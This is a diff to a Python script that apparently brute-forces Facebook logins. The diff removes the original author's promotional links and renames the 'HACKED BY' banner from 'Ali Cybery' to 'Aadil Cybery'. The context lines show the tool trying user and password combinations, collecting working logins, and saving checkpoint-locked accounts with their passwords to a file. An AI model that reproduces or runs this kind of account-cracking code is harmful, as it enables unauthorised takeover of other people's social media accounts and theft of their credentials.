@@ -47,35 +47,7 @@ def t():
 def cb():
     os.system('clear')
 
-#STYLISH 
 
-def Style_profaisor(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.1)
-    
-
-#
-
-
-
-
-Mking_youtube = random.choice(["https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw"])
- 
-youtuber = Mking_youtube
- 
-def youtube():
-	Style_profaisor("  please Follow My Fb account author :) Thank you")
-	os.system("xdg-open https://www.facebook.com/profile.php?id=100006267764888")
-	menu()
-	
-#MY TELEGRAM GROUp
- 
-def telegram():
-	Style_profaisor("  please Join My FB Grope :) Thank you")
-	os.system("xdg-open https://www.facebook.com/groups/890374404870466/?ref=share")
-	
 	
 
 
@@ -163,7 +135,7 @@ def Ali():
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
+                print '\x1b[1;92mHACKED BY Aadil Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '   ' + pass1 + '\n')
                 cps.close()
@@ -179,7 +151,7 @@ def Ali():
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
+                print '\x1b[1;92mHACKED BY Aadil Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '    ' + pass2 + '\n')
                 cps.close()
